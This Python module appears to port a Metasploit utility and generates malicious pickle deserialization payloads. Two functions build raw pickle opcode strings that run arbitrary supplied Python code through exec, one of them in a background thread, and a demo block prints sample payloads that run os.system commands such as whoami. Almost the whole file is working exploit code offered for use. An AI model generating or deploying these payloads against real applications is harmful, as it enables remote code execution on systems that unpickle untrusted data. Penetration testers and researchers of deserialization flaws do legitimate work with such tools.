#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MSF Python Deserialization Utility

This module provides payloads for exploiting Python deserialization vulnerabilities.
Payload source files are available in external/source/python_deserialization
"""


class PythonDeserialization:
    """Python deserialization class with exploit payloads"""
    
    @staticmethod
    def _payload_py3_exec(python_code):
        """
        Generate py3_exec payload
        This payload will work with Python 3.x targets to execute Python code in place
        """
        # Escape special characters for pickle protocol
        escaped = python_code
        for char in ['\\', '\n', '\r']:
            # Convert to \u00XX format
            escaped = escaped.replace(char, f"\\u00{ord(char):02x}")
        
        return f"c__builtin__\nexec\np0\n(V{escaped}\np1\ntp2\nRp3\n."
    
    @staticmethod
    def _payload_py3_exec_threaded(python_code):
        """
        Generate py3_exec_threaded payload
        This payload will work with Python 3.x targets to execute Python code in a new thread
        """
        # Escape special characters for pickle protocol
        escaped = python_code
        for char in ['\\', '\n', '\r']:
            # Convert to \u00XX format
            escaped = escaped.replace(char, f"\\u00{ord(char):02x}")
        
        return (
            f"c__builtin__\ngetattr\np0\n(cthreading\nThread\np1\nVstart\np2\ntp3\n"
            f"Rp4\n(g1\n(Nc__builtin__\nexec\np5\nN(V{escaped}\np6\ntp7\ntp8\nRp9\ntp10\nRp11\n."
        )
    
    # Payload dictionary
    # That could be in the future a list of payloads used to exploit the Python deserialization vulnerability.
    PAYLOADS = {
        'py3_exec': _payload_py3_exec.__func__,
        'py3_exec_threaded': _payload_py3_exec_threaded.__func__
    }
    
    @classmethod
    def payload(cls, payload_name, command=None):
        """
        Get a deserialization payload by name
        
        Args:
            payload_name: Name of the payload (e.g., 'py3_exec', 'py3_exec_threaded')
            command: Python code to execute (required)
            
        Returns:
            String containing the serialized payload
            
        Raises:
            ValueError: If payload name is not found or command is None
        """
        payload_name_sym = payload_name if isinstance(payload_name, str) else str(payload_name)
        
        if payload_name_sym not in cls.payload_names():
            raise ValueError(f"{payload_name} payload not found in payloads")
        
        return cls.PAYLOADS[payload_name_sym](command)
    
    @classmethod
    def payload_names(cls):
        """
        Get list of available payload names
        
        Returns:
            List of payload name strings
        """
        return list(cls.PAYLOADS.keys())


if __name__ == '__main__':
    import sys
    
    # Example usage
    print("Available Python deserialization payloads:")
    for name in PythonDeserialization.payload_names():
        print(f"  - {name}")
    
    if len(sys.argv) > 1:
        python_code = sys.argv[1]
        
        print(f"\nGenerating payloads for code: {python_code}")
        
        for payload_type in PythonDeserialization.payload_names():
            payload = PythonDeserialization.payload(payload_type, python_code)
            print(f"\n{payload_type}:")
            print(f"  Length: {len(payload)} bytes")
            print(f"  Payload: {payload[:200]}{'...' if len(payload) > 200 else ''}")
    else:
        print("\nUsage: python3 python_deserialization.py 'import os; os.system(\"id\")'")
        print("\nExample:")
        payload = PythonDeserialization.payload('py3_exec', '__import__("os").system("whoami")')
        print(f"  {payload}")
